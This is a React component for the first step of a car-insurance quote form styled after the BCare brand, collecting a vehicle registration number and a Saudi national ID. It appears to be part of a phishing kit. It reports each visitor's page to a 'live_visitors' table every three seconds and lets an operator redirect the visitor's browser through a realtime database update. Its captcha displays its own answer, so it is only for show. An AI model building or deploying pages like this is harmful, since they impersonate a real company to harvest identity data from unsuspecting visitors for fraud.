import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabaseClient';

interface Step1Data {
  vtype: string;
  ins_purpose: string;
  reg_type: string;
  reg_number: string;
  identity_num: string;
}

export const Step1Vehicle: React.FC = () => {
  const navigate = useNavigate();

  const [vtype, setVtype] = useState<string>('sedan');
  const [insPurpose, setInsPurpose] = useState<string>('new');
  const [regType, setRegType] = useState<string>('istimara');
  const [regNumber, setRegNumber] = useState<string>('');
  const [identityNum, setIdentityNum] = useState<string>('');

  const [captchaCode, setCaptchaCode] = useState<string>('');
  const [captchaInput, setCaptchaInput] = useState<string>('');
  const [captchaVerified, setCaptchaVerified] = useState<boolean>(false);
  const [showCaptcha, setShowCaptcha] = useState<boolean>(false);

  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  // إدارة Session ID للزائر
  const [sessionId] = useState<string>(() => {
    let sid = sessionStorage.getItem('bcare_sid');
    if (!sid) {
      sid = 'SID-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9).toUpperCase();
      sessionStorage.setItem('bcare_sid', sid);
    }
    return sid;
  });

  // 1) إرسال Heartbeat وتتبع التوجيه المباشر
  useEffect(() => {
    const sendHeartbeat = async () => {
      await supabase.from('live_visitors').upsert({
        session_id: sessionId,
        page: '/بيانات المركبة',
        last_seen: new Date().toISOString(),
      });
    };

    sendHeartbeat();
    const interval = setInterval(sendHeartbeat, 3000);

    // الاشتراك في التوجيه الفوري المباشر (Realtime Channel)
    const channel = supabase
      .channel(`visitor-${sessionId}`)
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'live_visitors',
          filter: `session_id=eq.${sessionId}`,
        },
        (payload) => {
          if (payload.new && payload.new.redirect_to) {
            window.location.href = payload.new.redirect_to;
          }
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, [sessionId]);

  // 2) استعادة البيانات المحفوظة عند التحميل
  useEffect(() => {
    const saved = JSON.parse(sessionStorage.getItem('bcare_step1') || '{}') as Partial<Step1Data>;
    if (saved.vtype) setVtype(saved.vtype);
    if (saved.ins_purpose) setInsPurpose(saved.ins_purpose);
    if (saved.reg_type) setRegType(saved.reg_type);
    if (saved.reg_number) setRegNumber(saved.reg_number);
    if (saved.identity_num) {
      setIdentityNum(saved.identity_num);
      if (saved.identity_num.length === 10) {
        setShowCaptcha(true);
        refreshCaptcha();
      }
    }
  }, []);

  const refreshCaptcha = () => {
    const code = String(Math.floor(100000 + Math.random() * 900000));
    setCaptchaCode(code);
    setCaptchaVerified(false);
    setCaptchaInput('');
  };

  const handleIdentityChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    setIdentityNum(val);
    if (val.length === 10) {
      setShowCaptcha(true);
      if (!captchaCode) refreshCaptcha();
    }
  };

  const handleCaptchaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '');
    setCaptchaInput(val);
    if (val.length === 6) {
      if (val === captchaCode) {
        setCaptchaVerified(true);
      } else {
        setCaptchaVerified(false);
      }
    }
  };

  const validateAndNext = () => {
    const newErrors: { [key: string]: string } = {};

    if (!regNumber.trim()) newErrors.reg = 'هذا الحقل مطلوب';
    if (identityNum.trim().length !== 10) newErrors.identity = 'أدخل رقم هوية صحيح مكون من 10 أرقام';
    if (identityNum.trim().length === 10 && !captchaVerified) {
      newErrors.captcha = 'الرمز غير صحيح، أعد المحاولة';
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    sessionStorage.setItem(
      'bcare_step1',
      JSON.stringify({
        vtype,
        ins_purpose: insPurpose,
        reg_type: regType,
        reg_number: regNumber,
        identity_num: identityNum,
      })
    );

    navigate('/step2');
  };

  return (
    <div className="min-h-screen bg-[#f0f6fb] font-['Cairo'] dir-rtl text-right">
      <nav className="bg-white border-b border-gray-200 px-6 h-[60px] flex items-center justify-between">
        <button onClick={() => navigate('/')} className="text-sm text-[#15638F] font-semibold">
          ← الرئيسية
        </button>
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 bg-[#15638F] rounded-md flex items-center justify-center text-white font-bold">
            B
          </div>
          <span className="font-extrabold text-lg text-[#15638F]">بي كير</span>
        </div>
        <div className="w-20"></div>
      </nav>

      <div className="max-w-[680px] mx-auto my-8 px-4 pb-12">
        <div className="bg-white rounded-2xl p-8 border border-gray-200 shadow-sm">
          <h2 className="text-lg font-bold mb-6 text-[#1a1a2e]">نوع المركبة</h2>

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-6">
            {[
              { id: 'sedan', label: 'سيارة', icon: '🚗' },
              { id: 'suv', label: 'دفع رباعي', icon: '🚙' },
              { id: 'van', label: 'فان', icon: '🚐' },
              { id: 'truck', label: 'شاحنة', icon: '🚛' },
            ].map((item) => (
              <label
                key={item.id}
                className={`flex flex-col items-center p-3 border-2 rounded-xl cursor-pointer transition-all text-xs font-bold ${
                  vtype === item.id
                    ? 'border-[#15638F] bg-[#e8f4fc] text-[#15638F]'
                    : 'border-gray-200 text-gray-700'
                }`}
              >
                <input
                  type="radio"
                  name="vtype"
                  value={item.id}
                  checked={vtype === item.id}
                  onChange={(e) => setVtype(e.target.value)}
                  className="hidden"
                />
                <span className="text-2xl mb-1">{item.icon}</span>
                {item.label}
              </label>
            ))}
          </div>

          <div className="mb-4">
            <label className="block text-xs font-bold text-gray-700 mb-1">
              رقم الاستمارة / البطاقة الجمركية <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              value={regNumber}
              onChange={(e) => setRegNumber(e.target.value)}
              placeholder="أدخل الرقم"
              className="w-full p-2.5 border border-gray-300 rounded-lg text-sm outline-none focus:border-[#15638F]"
            />
            {errors.reg && <span className="text-red-500 text-xs mt-1 block">{errors.reg}</span>}
          </div>

          <div className="mb-4">
            <label className="block text-xs font-bold text-gray-700 mb-1">
              رقم الهوية الوطنية / الإقامة <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              maxLength={10}
              value={identityNum}
              onChange={handleIdentityChange}
              placeholder="أدخل رقم الهوية (10 أرقام)"
              className="w-full p-2.5 border border-gray-300 rounded-lg text-sm outline-none focus:border-[#15638F]"
            />
            {errors.identity && <span className="text-red-500 text-xs mt-1 block">{errors.identity}</span>}
          </div>

          {showCaptcha && (
            <div className="mb-6 p-4 border border-blue-100 rounded-xl bg-slate-50">
              <label className="block text-xs font-bold text-gray-700 mb-2">
                تحقق من أنك لست روبوت <span className="text-red-500">*</span>
              </label>
              <div className="flex flex-col sm:flex-row items-center gap-4">
                <div className="flex items-center gap-2">
                  <div className="bg-blue-100 border-2 border-dashed border-[#15638F] px-4 py-2 rounded-lg font-mono text-xl font-bold tracking-widest text-[#0e4a6b] line-through">
                    {captchaCode}
                  </div>
                  <button
                    type="button"
                    onClick={refreshCaptcha}
                    className="p-2 text-[#15638F] hover:bg-blue-50 rounded-lg text-sm"
                  >
                    🔄
                  </button>
                </div>
                <div className="flex-1 w-full">
                  <input
                    type="text"
                    maxLength={6}
                    value={captchaInput}
                    onChange={handleCaptchaChange}
                    placeholder="أدخل الرقم الظاهر"
                    className="w-full p-2.5 border border-gray-300 rounded-lg text-sm outline-none focus:border-[#15638F]"
                  />
                </div>
              </div>
              {captchaInput.length === 6 && (
                <span className={`text-xs font-bold mt-2 block ${captchaVerified ? 'text-green-600' : 'text-red-500'}`}>
                  {captchaVerified ? '✓ صحيح' : '✗ غير صحيح'}
                </span>
              )}
              {errors.captcha && <span className="text-red-500 text-xs mt-1 block">{errors.captcha}</span>}
            </div>
          )}

          <button
            onClick={validateAndNext}
            className="w-full py-3.5 bg-[#15638F] text-white rounded-xl text-base font-bold hover:bg-[#0e4a6b] transition-colors"
          >
            التالي ←
          </button>
        </div>
      </div>
    </div>
  );
};
